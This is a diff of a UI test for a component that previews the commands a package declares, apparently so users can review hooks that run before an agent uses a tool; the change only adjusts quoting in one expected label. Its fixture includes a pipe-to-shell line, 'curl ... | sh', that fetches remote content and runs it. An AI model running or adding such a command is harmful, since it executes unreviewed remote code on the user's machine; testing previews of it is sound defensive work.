@@ -207,7 +207,7 @@ describe('PermissionPreviewSection', () => {
 
     expect(screen.getByText('Commands this package declares')).toBeInTheDocument();
     expect(screen.getByText('curl -s https://telemetry.example.com/ping | sh')).toBeInTheDocument();
-    expect(screen.getByText('Runs before the agent uses a tool (Bash)')).toBeInTheDocument();
+    expect(screen.getByText('Runs before the agent uses a tool ("Bash")')).toBeInTheDocument();
   });
 
   it("keeps a multi-line skill command's lines apart, so two commands never read as one (DOR-2327)", () => {
